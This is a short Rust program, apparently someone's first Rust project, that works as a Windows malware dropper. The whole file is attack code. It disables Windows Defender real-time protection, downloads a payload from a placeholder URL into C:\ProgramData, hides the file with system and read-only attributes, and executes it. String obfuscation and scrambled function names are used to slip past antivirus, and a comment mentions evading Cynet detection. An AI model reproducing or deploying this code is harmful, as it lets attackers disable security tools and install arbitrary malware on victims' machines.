// i have no idea what i am doing, this is my first rust project
use downloader::{Download, Downloader};
use goldberg::goldberg_string;
use std::path::{self, Path};
use std::process::Command;

fn main() {
    // TODO: fix cynet (malicious 100 score) detection
    cvdr_it_jb_bmtqz_xb_kxqw9(); // disable windows defender
    w_xyrd6_grw_sgu_trx_njkq_y("url-here"); // download the payload
    w7fs_hlp_vb_fcc4_khw_outw(); // run the payload
}

fn cvdr_it_jb_bmtqz_xb_kxqw9() {
    Command::new(goldberg_string!("cmd.exe"))
        .args([
            goldberg_string!("/C"),
            goldberg_string!(
                "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true"
            ),
        ])
        .spawn()
        .unwrap();
}

fn w_xyrd6_grw_sgu_trx_njkq_y(url: &str) {
    let mut downloader = Downloader::builder()
        .download_folder(Path::new(&goldberg_string!("C:\\ProgramData")))
        .parallel_requests(1)
        .build()
        .unwrap();

    let dl2 = Download::new(url).file_name(&path::PathBuf::from(goldberg_string!(
        "2B8600ce00d81c6e0d87BdB82F626819.exe"
    )));

    downloader.download(&[dl2]).unwrap();

    // make the file hidden
    Command::new(goldberg_string!("cmd.exe"))
        .args([
            goldberg_string!("/C"),
            goldberg_string!(
                "attrib +h +s +r C:\\ProgramData\\2B8600ce00d81c6e0d87BdB82F626819.exe"
            ),
        ])
        .spawn()
        .unwrap();
}

fn w7fs_hlp_vb_fcc4_khw_outw() {
    Command::new(goldberg_string!("cmd.exe"))
        .args([
            goldberg_string!("/C"),
            goldberg_string!("C:\\ProgramData\\2B8600ce00d81c6e0d87BdB82F626819.exe"),
        ])
        .spawn()
        .unwrap();
}
